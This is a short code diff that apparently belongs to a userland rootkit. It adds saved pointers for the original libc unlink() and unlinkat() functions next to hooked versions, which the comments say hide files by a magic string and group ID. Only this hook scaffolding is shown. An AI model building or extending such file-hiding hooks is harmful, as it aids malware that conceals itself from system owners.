@@ -3,6 +3,7 @@
 /*
  * unlink() hook, hide based on the magic STRING and GID.
 */
+int (*o_unlink)(const char *);
 int unlink(const char *pathname) {
 
 	#ifdef DEBUG
@@ -34,6 +35,7 @@ int unlink(const char *pathname) {
 /*
  * unlinkat() hook, hide based on the magic STRING and GID.
 */
+int (*o_unlinkat)(int, const char *, int);
 int unlinkat(int dirfd, const char * pathname, int flags) {
 
 	#ifdef DEBUG
